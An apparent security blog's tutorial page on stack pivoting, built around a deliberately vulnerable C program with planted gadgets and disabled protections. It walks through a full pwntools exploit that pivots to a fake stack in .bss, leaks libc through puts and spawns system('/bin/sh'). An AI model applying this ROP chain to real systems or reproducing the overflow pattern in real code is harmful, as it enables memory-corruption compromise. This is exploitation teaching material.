@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] Stack Pivoting · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique to configure a Fake Stack in an area with write permission using a gadget. If the payload is stored, overflow should only occur up to ret. If the payload is not stored, up to chain + leave_ret.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-stack-pivoting/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-stack-pivoting/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-stack-pivoting/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] Stack Pivoting · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique to configure a Fake Stack in an area with write permission using a gadget. If the payload is stored, overflow should only occur up to ret. If the payload is not stored, up to chain + leave_ret."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-stack-pivoting/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] Stack Pivoting","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique to configure a Fake Stack in an area with write permission using a gadget. If the payload is stored, overflow should only occur up to ret. If the payload is not stored, up to chain + leave_ret.","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-stack-pivoting/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-stack-pivoting/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] Stack Pivoting</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ This is a technique to configure a Fake Stack in an area with write permission using a gadget. If the payload is stored, overflow should only occur up to ret. If the payload is not stored, up to chain + leave_ret.</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>1 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong> </p>
+<p>This is a technique to configure a Fake Stack in an area with write permission using a gadget.</p>
+<ul>
+<li>If payload is stored, overflow should occur only up to ret.</li>
+<li>If the payload is not saved, you must include chain + leave_ret.</li>
+</ul>
+<p>In general, this is a technique used when a bof vulnerability can only be used once or when overflow is possible only up to ret.</p>
+<p>Let’s look at it through a simple example.</p>
+<pre><code>// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int cnt = 0;
+
+void gift(){
+	 __asm__ (&quot;pop %r9&quot;);
+	__asm__ (&quot;pop %r8&quot;);
+	__asm__ (&quot;pop %rcx&quot;);
+	__asm__ (&quot;pop %rdx&quot;);
+	__asm__ (&quot;pop %rsi&quot;);
+	__asm__ (&quot;pop %rdi&quot;);
+	__asm__ (&quot;ret&quot;);
+	__asm__ (&quot;pop %rax&quot;);
+   	__asm__ (&quot;ret&quot;);
+  	__asm__ (&quot;pop %rbx&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rbx, (%rax)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rax, (%rbx)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+}
+void vuln() {
+    char buf[0x40];
+    if(cnt != 0){
+	    exit(-1);
+    }
+    cnt = 1;
+    puts(&quot;Hello! whrd&quot;);
+    read(0,buf,0x80);
+}
+int main() {
+    initialize();
+    vuln();
+    return 0;
+}
+</code></pre>
+<p>Gadgets were made at random.</p>
+<p>Here we will use bss, a memory area with write permission.</p>
+<p><img src="/assets/images/tistory/tistory-0fea48d33bf4/001.png" alt=""></p>
+<p>This is the first payload.</p>
+<pre><code>payload = b'a'*0x40
+payload += p64(bss+0x300)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x300)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+p.send(payload)
+</code></pre>
+<p>In addition to bss+0x300, a fake stack is configured.</p>
+<p>After going through the leave-ret process, rbp and rsp point to fake_stack.</p>
+<pre><code>payload = p64(bss+0x400)
+payload += p64(p_rdi)
+payload += p64(read_got)
+payload += p64(puts)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x400)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+
+p.send(payload)
+</code></pre>
+<p>It is a process of leaking.</p>
+<p>After obtaining libc_base using puts(), a new fake stack is configured and receiving input at location bss+0x400 for exploit.</p>
+<pre><code>p.recvuntil(b'\x0a')
+leak = u64(p.recvn(6) + b'\x00'*2)
+libc_base = leak - libc.sym['read']
+
+print('libc_base : ', hex(libc_base))
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = p64(0x0)
+payload += p64(p_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.send(payload)
+</code></pre>
+<p>You can run system(‘/bin/sh’); with the libc you obtained.</p>
+<p><img src="/assets/images/tistory/tistory-0fea48d33bf4/002.png" alt=""></p>
+<p>If you run it, you can see that system() is running normally.</p>
+<pre><code>from pwn import *
+
+target = b'./ex'
+
+context.log_level = 'debug'
+p = process(target)
+e = ELF(target)
+libc = ELF(b'/lib/x86_64-linux-gnu/libc.so.6')
+
+read_got = e.got['read']
+read = e.plt['read']
+puts = e.plt['puts']
+bss = e.bss()
+leave_ret = 0x0000000000401252
+ret = 0x000000000040101a
+p_rdi = 0x00000000004011a5
+p_rsi_rdi = 0x00000000004011a4
+p_rdx_rsi_rdi = 0x00000000004011a3
+
+####################################
+
+payload = b'a'*0x40
+payload += p64(bss+0x300)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x300)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+p.send(payload)
+
+####################################
+
+payload = p64(bss+0x400)
+payload += p64(p_rdi)
+payload += p64(read_got)
+payload += p64(puts)
+payload += p64(p_rdx_rsi_rdi)
+payload += p64(0x100)
+payload += p64(bss+0x400)
+payload += p64(0x0)
+payload += p64(read)
+payload += p64(leave_ret)
+
+p.send(payload)
+
+####################################
+
+p.recvuntil(b'\x0a')
+leak = u64(p.recvn(6) + b'\x00'*2)
+libc_base = leak - libc.sym['read']
+
+print('libc_base : ', hex(libc_base))
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+####################################
+
+payload = p64(0x0)
+payload += p64(p_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.send(payload)
+
+####################################
+
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-stack-pivoting/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
